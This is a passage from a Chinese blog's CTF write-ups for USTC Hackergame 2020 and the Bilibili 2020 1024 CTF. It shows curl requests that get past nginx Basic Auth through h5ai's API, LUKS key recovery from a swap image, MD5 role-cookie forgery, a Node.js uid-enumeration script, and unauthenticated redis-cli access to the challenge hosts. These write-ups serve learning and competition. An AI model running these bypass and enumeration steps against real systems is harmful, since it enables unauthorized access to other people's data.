再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a 